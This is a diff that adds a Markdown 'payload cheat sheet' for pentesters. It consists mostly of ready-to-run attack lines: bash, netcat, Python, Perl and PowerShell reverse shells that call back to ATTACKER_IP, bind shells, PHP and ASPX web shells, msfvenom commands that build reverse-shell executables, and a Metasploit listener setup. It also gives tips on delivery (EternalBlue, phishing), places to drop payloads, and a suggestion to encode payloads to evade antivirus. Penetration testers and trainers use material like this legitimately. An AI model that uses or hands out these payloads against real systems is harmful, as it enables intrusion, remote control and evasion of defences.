@@ -411,3 +411,253 @@ Exploit → Payload executes → Target connects → Attacker gets shell
 
 ---
 
+# 💣 Payload Cheat Sheet (Table Format) – Pentester Quick Reference
+
+---
+
+# 1️⃣ Payload Basics
+
+|Term|Definition|
+|---|---|
+|Payload|Code executed on target after exploitation|
+|Purpose|Gain shell, execute commands, control system|
+|Delivered via|Exploit, file upload, command injection|
+|Runs on|Target system|
+|Controlled by|Attacker|
+
+---
+
+# 2️⃣ Payload Types Overview
+
+|Payload Type|Description|Example|
+|---|---|---|
+|Reverse Shell|Target connects back to attacker|bash reverse shell|
+|Bind Shell|Target listens for attacker|nc bind shell|
+|Meterpreter|Advanced shell|Metasploit Meterpreter|
+|Web Shell|Web-based shell|PHP web shell|
+|Staged Payload|Loads in stages|windows/meterpreter/reverse_tcp|
+|Stageless Payload|Fully self-contained|windows/meterpreter_reverse_tcp|
+
+---
+
+# 3️⃣ Reverse Shell Payloads
+
+## Linux Reverse Shells
+
+|Tool|Payload|
+|---|---|
+|Bash|`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`|
+|Netcat|`nc ATTACKER_IP 4444 -e /bin/bash`|
+|Python|`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`|
+|Perl|`perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'`|
+
+---
+
+## Windows Reverse Shells
+
+|Tool|Payload|
+|---|---|
+|Netcat|`nc.exe ATTACKER_IP 4444 -e cmd.exe`|
+|PowerShell|`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);..."`|
+|PowerShell Simple|`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)`|
+
+---
+
+# 4️⃣ Bind Shell Payloads
+
+## Linux Bind Shell
+
+|Tool|Payload|
+|---|---|
+|Netcat|`nc -lvnp 4444 -e /bin/bash`|
+|Bash|`/bin/bash -i`|
+
+---
+
+## Windows Bind Shell
+
+|Tool|Payload|
+|---|---|
+|Netcat|`nc.exe -lvnp 4444 -e cmd.exe`|
+
+---
+
+# 5️⃣ Web Shell Payloads
+
+## PHP Web Shell
+
+|Payload|
+|---|
+|`<?php system($_GET['cmd']); ?>`|
+
+Access:
+
+```id="plcs1"
+http://target/shell.php?cmd=whoami
+```
+
+---
+
+## ASPX Web Shell
+
+|Payload|
+|---|
+|`<% eval request("cmd") %>`|
+
+---
+
+# 6️⃣ msfvenom Payload Creation
+
+## Windows Payload
+
+|Purpose|Command|
+|---|---|
+|Create exe payload|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe`|
+
+---
+
+## Linux Payload
+
+|Purpose|Command|
+|---|---|
+|Create elf payload|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf`|
+
+---
+
+## Web Payload
+
+|Purpose|Command|
+|---|---|
+|PHP payload|`msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.php`|
+
+---
+
+# 7️⃣ Meterpreter Payloads
+
+|Payload|Description|
+|---|---|
+|windows/meterpreter/reverse_tcp|Windows Meterpreter reverse shell|
+|linux/x64/meterpreter/reverse_tcp|Linux Meterpreter|
+|php/meterpreter_reverse_tcp|PHP Meterpreter|
+
+---
+
+# 8️⃣ Listener Setup (Attacker)
+
+|Tool|Command|
+|---|---|
+|Netcat|`nc -lvnp 4444`|
+|Metasploit|`use exploit/multi/handler`|
+
+Metasploit example:
+
+```bash
+set payload windows/meterpreter/reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT 4444
+run
+```
+
+---
+
+# 9️⃣ Staged vs Stageless Payloads
+
+|Type|Description|
+|---|---|
+|Staged|Loads payload in parts|
+|Stageless|Complete payload delivered at once|
+
+Examples:
+
+|Type|Payload|
+|---|---|
+|Staged|windows/meterpreter/reverse_tcp|
+|Stageless|windows/meterpreter_reverse_tcp|
+
+---
+
+# 🔟 Payload File Formats
+
+|Format|OS|
+|---|---|
+|.exe|Windows|
+|.elf|Linux|
+|.php|Web|
+|.ps1|PowerShell|
+|.asp|ASP|
+|.aspx|ASP.NET|
+
+---
+
+# 1️⃣1️⃣ Payload Delivery Methods
+
+|Method|Example|
+|---|---|
+|Exploit|EternalBlue|
+|File Upload|Upload shell.exe|
+|Command Injection|Reverse shell one-liner|
+|Web upload|PHP shell|
+|Phishing|Malicious attachment|
+
+---
+
+# 1️⃣2️⃣ Payload Verification Commands
+
+After shell access:
+
+|Command|Purpose|
+|---|---|
+|whoami|Current user|
+|hostname|System name|
+|pwd|Current directory|
+|id|User privileges|
+|uname -a|System info|
+
+---
+
+# 1️⃣3️⃣ Common Payload Locations
+
+|Location|OS|
+|---|---|
+|/tmp|Linux|
+|/dev/shm|Linux|
+|C:\Windows\Temp|Windows|
+|C:\Users\Public|Windows|
+
+---
+
+# 1️⃣4️⃣ Payload Troubleshooting
+
+|Problem|Solution|
+|---|---|
+|No connection|Check listener|
+|AV blocking|Use encoded payload|
+|Wrong architecture|Use correct x86/x64|
+|Firewall blocking|Use reverse shell|
+
+---
+
+# 1️⃣5️⃣ Quick Reference (Most Important)
+
+|Task|Command|
+|---|---|
+|Start listener|nc -lvnp 4444|
+|Linux reverse shell|bash -i >& /dev/tcp/IP/4444 0>&1|
+|Windows reverse shell|nc.exe IP 4444 -e cmd.exe|
+|Create payload|msfvenom -p windows/shell_reverse_tcp|
+|Web shell||
+
+---
+
+# 1️⃣6️⃣ Pentester Payload Workflow
+
+|Step|Action|
+|---|---|
+|1|Find vulnerability|
+|2|Select payload|
+|3|Start listener|
+|4|Deliver payload|
+|5|Gain shell|
+|6|Escalate privileges|
+
+---
